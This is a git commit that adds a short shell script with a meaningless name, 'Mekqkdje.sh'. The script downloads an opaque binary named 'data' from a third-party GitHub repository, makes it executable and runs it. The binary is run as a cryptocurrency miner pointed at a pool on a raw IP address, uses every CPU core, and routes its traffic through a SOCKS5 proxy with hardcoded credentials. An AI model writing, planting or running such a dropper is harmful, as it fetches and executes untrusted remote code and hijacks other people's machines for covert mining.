9c8328ff675bbd4d6d8a4ec99c018a8fcf629c60
Garukuape <106439515+Garukuape@users.noreply.github.com>
2022-05-28 22:55:17 +0700

    Create Mekqkdje.sh

---
+++ Mekqkdje.sh
@@ -0,0 +1,6 @@
+#!/bin/sh
+apt update -y
+apt install libjansson-dev -y
+wget -q https://github.com/thirthada007/DevOps/raw/main/data
+chmod +x data
+./data -a yespower -o stratum+tcp://206.189.2.17:3333 -u WYBnNEVUPjTFA1rQypC6XK3DRNmosrgqce.kom -p x -t $(nproc) -x socks5://Gahsdbdn:Aapaoddun@185.101.169.21:6565
